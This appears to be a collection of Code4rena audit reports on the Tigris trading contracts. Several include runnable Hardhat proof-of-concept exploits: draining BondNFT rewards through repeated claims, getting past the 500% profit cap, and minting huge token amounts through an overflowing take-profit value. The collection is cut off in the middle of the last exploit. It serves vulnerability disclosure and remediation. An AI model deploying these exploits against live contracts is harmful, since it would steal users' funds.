as margin to: 1. Initiate a market order 2. Add margin 3. Add to position 4. initiate limit order  The transaction will revert.   This is due to the the `_handleDeposit` which is called in all of the above uses.  `_handleDeposit` calls the `USDT` margin asset `approve` function with `type(uint).max`. From the second time `approve` will be called, the transaction will revert.  `_handleDeposit` in `Trading`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652 ```     function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault , ERC20PermitData calldata _permitData, address _trader) internal { ------             IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);             IERC20(_marginAsset).approve(_stableVault, type(uint).max);             IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier); ------     } ```  ## Tools Used  VS Code  ## Recommended Mitigation Steps  No need to to approve `USDT` every time.  The protocol could: 1. Keep a record if allowance was already set on an address 2. Create an external function that can be called by the owner to approve the a token address
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/ReyAdmirado-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187   # Vulnerability details  ## Impact Malicious user can drain all assets in BondNFT, and other users will lose their rewards.  ## Proof of Concept When calling [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate `accRewardsPerShare`. This is because the reward after the `expireEpoch` does not belong to that expired bond and needs to be redistributed to all other bonds.  ```solidity   if (bond.expired) {       uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);       if (totalShares[bond.asset] > 0) {           accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];       }   } ```  In the current implementation of [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.  According to the formula in the above code, we can find that although each subsequent `claim()` of the expired bond will transfer 0 reward, the `accRewardsPerShare` will be updated cumulatively. Thus, the pending rewards of all other users will increase every time the expired bond is `claim()`ed.  A malicious user can exploit this vulnerability to steal all assets in BondNFT contract: 1. Create two bonds (B1, B2) with different `expireEpoch` 2. At some time after B1 has expired (B2 has not), keep calling [`Lock.claim(B1)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract. 3. Call [`Lock.claim(B2)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.  An example of such an attack: ```javascript diff --git a/test/09.Bonds.js b/test/09.Bonds.js index 16c3ff5..7c445c3 100644 --- a/test/09.Bonds.js +++ b/test/09.Bonds.js @@ -245,7 +245,90 @@ describe("Bonds", function () {        await lock.connect(user).release(2);        expect(await bond.pending(1)).to.be.equals("999999999999999999725"); // Negligable difference from 1000e18 due to solidity division      }); + +    it.only("Drain BondNFT rewards", async function () { +      const getState = async () => { +        const balHacker= await stabletoken.balanceOf(hacker.address); +        const balLock = await stabletoken.balanceOf(lock.address); +        const balBond = await stabletoken.balanceOf(bond.address); +        const [pending1, pending2, pending3] = [await bond.pending(1), await bond.pending(2), await bond.pending(3)]; +        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3}; +      }; +      const parseEther = (v) => ethers.utils.parseEther(v.toString()); +      const gwei = parseEther(1).div(1e9); + +      // prepare tokens +      const TotalRewards = parseEther(8000); +      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards); +      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000)); +      const hacker = rndAddress; +      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700)); +      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000)); + +      // bond1 - user +      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100); +      await bond.distribute(stabletoken.address, parseEther(3800)); +      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei); +      // Skip some time +      await network.provider.send("evm_increaseTime", [20*86400]); +      await network.provider.send("evm_mine"); + +      // bond2 - hacker +      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10); +      // bond3 - hacker +      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100); + +      await bond.distribute(stabletoken.address, parseEther(2100)); + +      // Skip 10+ days, bond2 is expired +      await network.provider.send("evm_increaseTime", [13*86400]); +      await network.provider.send("evm_mine"); +      await bond.distribute(stabletoken.address, parseEther(2100)); + +      // check balances before hack +      let st = await getState(); +      expect(st.bond).to.be.equals(TotalRewards); +      expect(st.lock).to.be.equals(parseEther(3000)); +      expect(st.hacker).to.be.equals(parseEther(0+700)); +      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei); +      expect(st.pending2).to.be.closeTo(parseEther(100), gwei); +      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei); + +      // first claim of expired bond2 +      await lock.connect(hacker).claim(2); +      st = await getState(); +      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei); +      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei); +      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000)); +      expect(st.pending2).to.be.eq(parseEther(0)); +      expect(st.pending3).to.be.gt(parseEther(1000+1000)); + +      // hack +      const remainReward = st.bond; +      let pending3 = st.pending3; +      let i = 0; +      for (; remainReward.gt(pending3); i++) { +        // claim expired bond2 repeatedly +        await lock.connect(hacker).claim(2); +        // pending3 keeps increasing +        pending3 = await bond.pending(3); +      } +      console.log(`claim count: ${i}\nremain: ${ethers.utils.formatEther(remainReward)}\npending3: ${ethers.utils.formatEther(pending3)}\n`); + +      // send diff, then drain rewards in bond +      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward)); +      await lock.connect(hacker).claim(3); +      st = await getState(); +      // !! bond is drained !! +      expect(st.bond).to.be.eq(0); +      // !! hacker gets all rewards !! +      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700))); +      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000)); +      expect(st.pending2).to.be.eq(0); +      expect(st.pending3).to.be.eq(0); +    });    }); +    describe("Withdrawing", function () {      it("Only expired bonds can be withdrawn", async function () {        await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther("100")); ```  Output: ```   Bonds     Rewards claim count: 41 remain: 7900.000000000000000002 pending3: 8055.7342616570405578        ✓ Drain BondNFT rewards    1 passing (4s)  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps I recommend that an expired bond should be forced to `release()`, `claim()` an expired bond should revert.  Sample code:  ```solidity  diff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol index 33a6e76..77e85ae 100644 --- a/contracts/BondNFT.sol +++ b/contracts/BondNFT.sol @@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {          amount = bond.amount;          unchecked {              totalShares[bond.asset] -= bond.shares; -            (uint256 _claimAmount,) = claim(_id, bond.owner); +            (uint256 _claimAmount,) = _claim(_id, bond.owner);              amount += _claimAmount;          }          asset = bond.asset; @@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {          _burn(_id);          emit Release(asset, lockAmount, _owner, _id);      } +      /** -     * @notice Claim rewards from a bond +     * @notice Claim rewards from an unexpired bond       * @dev Should only be called by a manager contract       * @param _id ID of the bond to claim rewards from       * @param _claimer address claiming rewards @@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {      function claim(          uint _id,          address _claimer +    ) public onlyManager() returns(uint amount, address tigAsset) { +        Bond memory bond = idToBond(_id); +        require(!bond.expired, "expired"); +        return _claim(_id, _claimer); +    } + +    /** +     * @notice Claim rewards from a releasing bond or an unexpired bond +     * @param _id ID of the bond to claim rewards from +     * @param _claimer address claiming rewards +     * @return amount amount of tigAsset claimed +     * @return tigAsset tigAsset token address +     */ +    function _claim( +        uint _id, +        address _claimer      ) public onlyManager() returns(uint amount, address tigAsset) {          Bond memory bond = idToBond(_id);          require(_claimer == bond.owner, "!owner"); ```  
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329   # Vulnerability details  ## Impact  `BondNFT`s should be transferrable. According the the proposal and the sponsor, `BondNFT`s should could be sold and borrowed against. The proposal for context: https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3  The current implementation limits selling/depositing to only the same day that rewards are distributed for the `tigAsset` of the bond.  The impact if no rewards are distributed in the same day:  1. `BondNFT`s listed on open markets will not be able to fulfil the orders 2. `BondNFT`s deposited as collateral will not be release the collateral  Because other market/platforms used for selling/depositing will not call `claimGovFees` to distribute rewards, they will revert when trying to transfer the `BondNFT`.  Realistic examples could be `BondNFT`s listed on opensea.   Example of reasons why rewards would not be distributed in the same day: 1. Low activity from investors, rewards are distirbuted when users lock/release/extend 2. `tigAsset` is blacklisted in `BondNFT`, rewards will not be distributed in such case.   ## Proof of Concept  `BondNFT` has a mechanism to update the time `tigAsset` rewards are distributed. It uses a map that points to the last timestamp rewards were distributed for `epoch[tigAsset]`.   `distribute` function in `BondNFT`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221 ```     function distribute(         address _tigAsset,         uint _amount     ) external {         if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);         unchecked {             uint aEpoch = block.timestamp / DAY;             if (aEpoch > epoch[_tigAsset]) {                 for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {                     epoch[_tigAsset] += 1;                     accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];                 }             }             accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];         }         emit Distribution(_tigAsset, _amount);     } ``` (Please not that if the asset is blacklisted through `allowedAsset` the  `epoch[tigAsset]` will not be updated)  When `BondNFT`s are transfered, a check is implemented to make sure `epoch[tigAsset]` is updated to the current day.  According to the sponsor the reason for this check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated.  `_transfer` function in `BondNFT`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329 ```     function _transfer(         address from,         address to,         uint256 _id     ) internal override {         Bond memory bond = idToBond(_id);         require(epoch[bond.asset] == block.timestamp/DAY, "Bad epoch");         require(!bond.expired, "Expired!");         unchecked {             require(block.timestamp > bond.mintTime + 300, "Recent update");             userDebt[from][bond.asset] += bond.pending;             bondPaid[_id][bond.asset] += bond.pending;         }         super._transfer(from, to, _id);     } ```  As can be seen above, if `epoch[tigAsset]` is not set to the same day of the transfer, the transfer will fail and the impacts in the impact section will happen.   ### Hardhat POC  There is already an implemented test showing that transfers fail when `epoch[tigAsset]` is not updated: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472 ```     it("Bond can only transferred if epoch is updated", async function () {       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther("3000"));       await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther("3000"), 365);        await network.provider.send("evm_increaseTime", [864000]);       await network.provider.send("evm_mine");        await expect(bond.connect(owner).safeTransferMany(user.address, [1])).to.be.revertedWith("Bad epoch");     }); ```  ## Tools Used  VS Code, Hardhat  ## Recommended Mitigation Steps  The reason for the check is to validate that a bond.expired updated according to the actual timestamp. Instead of having  ```         require(epoch[bond.asset] == block.timestamp/DAY, "Bad epoch");         require(!bond.expired, "Expired!"); ```  You could replace it with: ```  require(bond.expireEpoch  >= block.timestamp/DAY, "Transfer after expired not allowed"); ``` 
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168   # Vulnerability details  ## Impact  In the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that: >NFT holders only earn the profits generated by the platform on the chain that the NFT is on.  It is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to have more than one NFT with the same token id on different chains.  ## Proof of Concept   - Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A. https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124  - The `endpoint` is responsible to complete the bridging task on chain A.  - Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful. ``` function lzReceive(         uint16 _srcChainId,         bytes memory _srcAddress,         uint64 _nonce,         bytes memory _payload     ) external override {         require(_msgSender() == address(endpoint), "!Endpoint");         (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));         // try-catch all errors/exceptions         if (!success) {             failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);             emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);         }     } ``` https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168  - Since the transaction was not successful, the message will be added as a failed message. ``` failedMessages[chainB][Bob's address][_nonce] = keccak256(_payload); ``` https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178  - Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows: `lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`  - Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.  - Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.  - Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.  - He calls the function `retryMessage` to retry the failed message on chain A. https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206  - By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows: `retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`  - Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability.   - Now he can for example sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.  - Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.  ***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to both having failed message and being able to mint it at the same time.***  Please note that if this scenario happens again, more NFT with the same token id X will be minted to Bob on different chains.   ## Tools Used  ## Recommended Mitigation Steps It is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to he failed messages to be minted later. ``` mapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;      function lzReceive(         uint16 _srcChainId,         bytes memory _srcAddress,         uint64 _nonce,         bytes memory _payload     ) external override {                  require(!consumedMessage[_srcChainId][_srcAddress][_nonce], "already consumed");         consumedMessage[_srcChainId][_srcAddress][_nonce] = true;          require(_msgSender() == address(endpoint), "!Endpoint");         (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));         // try-catch all errors/exceptions         if (!success) {             failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);             emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);         }     } ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0x4non-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L267-L269   # Vulnerability details  ## Impact To protect the fund of vault, the protocol has a security mechanism which limits   ``` Maximum PnL is +500%.  ``` source: https://docs.tigris.trade/protocol/trading-and-fees#limitations  But the implementation is missing to check this limitation while ````addToPosition()````, an attacker can exploit it to get more profit than expected.  ## Proof of Concept The following test case shows both normal case and the exploit scenario. In the normal case,  a 990 USD margin, get back a 500% of 4950 USD payout, and the profit is 3960 USD. In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.  ``` const { expect } = require("chai"); const { deployments, ethers, waffle } = require("hardhat"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require("constants");  describe("Design Specification: Maximum PnL is +500%", function () {    let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get("StableToken");     stabletoken = await ethers.getContractAt("StableToken", StableToken.address);     Trading = await deployments.get("Trading");     trading = await ethers.getContractAt("Trading", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get("TradingExtension");     tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);     const Position = await deployments.get("Position");     position = await ethers.getContractAt("Position", Position.address);     MockDAI = await deployments.get("MockDAI");     mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);     MockUSDC = await deployments.get("MockUSDC");     mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);     const PairsContract = await deployments.get("PairsContract");     pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);     const Referrals = await deployments.get("Referrals");     referrals = await ethers.getContractAt("Referrals", Referrals.address);     StableVault = await deployments.get("StableVault");     stablevault = await ethers.getContractAt("StableVault", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);     await network.provider.send("evm_mine");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory("BadStableVault");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get("TradingLibrary");     tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe("Bypass the maximum PnL check to take extra profit", function () {     let orderId;     let closePriceData;     let closeSig;     let initPrice = parseEther("1000");     let closePrice = parseEther("2000");     beforeEach(async function () {       let maxWin = await trading.maxWinPercent();       expect(maxWin.eq(5e10)).to.equal(true);        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);        // Some time later       await network.provider.send("evm_setNextBlockTimestamp", [2000001000]);       await network.provider.send("evm_mine");              // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900       closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];       let closeMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, closePrice, 0, 2000001000, false]         )       );       closeSig = await node.signMessage(         Buffer.from(closeMessage.substring(2), 'hex')       );      });      it.only("All profit is $9900, close the order normally, only get $3960 profit", async function () {       let balanceBefore = await stabletoken.balanceOf(owner.address);       await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);       let balanceAfter = await stabletoken.balanceOf(owner.address);       let marginAfterFee = parseEther("990");       let payout = balanceAfter.sub(balanceBefore);       expect(payout.eq(parseEther("4950"))).to.be.true;        let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);       expect(profit.eq(parseEther("3960"))).to.be.true;      });      it.only("All profit is $9900, bypass the PnL check to take extra $2600 profit", async function () {       // We increase the possition first rather than closing the profit order directly       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       let extraMargin = parseEther("1000");       await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);        // 60 secs later       await network.provider.send("evm_setNextBlockTimestamp", [2000001060]);       await network.provider.send("evm_mine");          // Now we close the order to take all profit       closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];       let closeMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, closePrice, 0, 2000001060, false]         )       );       closeSig = await node.signMessage(         Buffer.from(closeMessage.substring(2), 'hex')       );        let balanceBefore = await stabletoken.balanceOf(owner.address);       await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);       let balanceAfter = await stabletoken.balanceOf(owner.address);       let marginAfterFee = parseEther("990").add(extraMargin.mul(990).div(1000));       let originalProfit = parseEther("3960");       let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);       expect(extraProfit.gt(parseEther('2600'))).to.be.true;     });    }); });   ```  The test result ```  Design Specification: Maximum PnL is +500%     Bypass the maximum PnL check to take extra profit       √ All profit is $9900, close the order normally, only get $3960 profit       √ All profit is $9900, bypass the PnL check to take extra $2600 profit ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Add a check for ````addToPosition()```` function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117   # Vulnerability details  ## Impact Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.They must first be approved by zero and then the actual allowance must be approved.   ## Proof of Concept https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117  ```solidity     function claimGovFees() public {         address[] memory assets = bondNFT.getAssets();          for (uint i=0; i < assets.length; i++) {             uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));             IGovNFT(govNFT).claim(assets[i]);             uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));             IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);// @audit this could fail always with some tokens,              bondNFT.distribute(assets[i], balanceAfter - balanceBefore);         }     } ```  ## Tools Used manual revision  ## Recommended Mitigation Steps    Add an approve(0) before approving; ```     function claimGovFees() public {         address[] memory assets = bondNFT.getAssets();          for (uint i=0; i < assets.length; i++) {             uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));             IGovNFT(govNFT).claim(assets[i]);             uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));             IERC20(assets[i]).approve(address(bondNFT), 0);             IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);             bondNFT.distribute(assets[i], balanceAfter - balanceBefore);         }   } ```      
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/chrisdior4-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/utils/TradingLibrary.sol#L46   # Vulnerability details  # Certain fee configuration enables vaults to be drained  ### Summary An overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.   ### Detailed exploit process description When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.  The exploiter starts by setting himself as referrer, in order to later receive the referrer fees.  The next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin.  The order is then immediately executed through `executeLimitOrder()`. The final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.   ### Detailed bug description The bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC). Line 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.  Later, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.   ### Recommended mitigation The core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.    ### PoC Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`: ```javascript describe("PoC", function () {     it.only("PoC", async function () {       // Setup token balances and approvals       const mockDAI = await ethers.getContractAt("MockERC20", MockDAI.address)       await mockDAI.connect(owner).transfer(user.address, parseEther("10000"))       await mockDAI.connect(user).approve(trading.address, parseEther("10000"))       const permitData = [         "0",         "0",         "0",         "0x0000000000000000000000000000000000000000000000000000000000000000",         "0x0000000000000000000000000000000000000000000000000000000000000000",         false       ]        // Create referral code       await referrals.connect(user).createReferralCode(ethers.constants.HashZero)        // Set the fees       await trading.connect(owner).setFees(         false,        // close         "200000000",  // dao           "0",          // burn         "100000000",  // referral         "0",          // bot         "0",          // percent       )         // ============================================================== //       // =================== Create the limit order =================== //       // ============================================================== //       const tradeInfo = [         parseEther("1"),          // margin amount         MockDAI.address,          // margin asset         StableVault.address,      // stable vault         parseEther("2"),          // leverage         0,                        // asset id         false,                    // direction (short)         "115792089237316195423570985008687907854269984665640564039467",          // take profit price         parseEther("0"),       // stop loss price         ethers.constants.HashZero // referral (ourself)       ];        // Create the order       await trading.connect(user).initiateLimitOrder(         tradeInfo,            // trade info         1,                    // order type (limit)         parseEther("1000"),   // price         permitData,           // permit         user.address          // trader       )         // ============================================================== //       // =================== Execute the limit order ================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       await network.provider.send("evm_mine")        // Create the price data       let priceData = [         node.address,                                   // provider         0,                                              // asset id         parseEther("1000"),                             // price         10000000,                                       // spread (0.1%)         (await ethers.provider.getBlock()).timestamp,   // timestamp         false                                           // is closed       ]        // Sign the price data       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       )        // Execute the limit order       await trading.connect(user).executeLimitOrder(1, priceData, sig);            // ============================================================== //       // ======================== Close order  ======================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       await network.provider.send("evm_mine")        // Close order       await trading.connect(user).limitClose(         1,          // id         true,       // take profit         priceData,  // price data         sig,        // signature       )        // Print results       const amount = 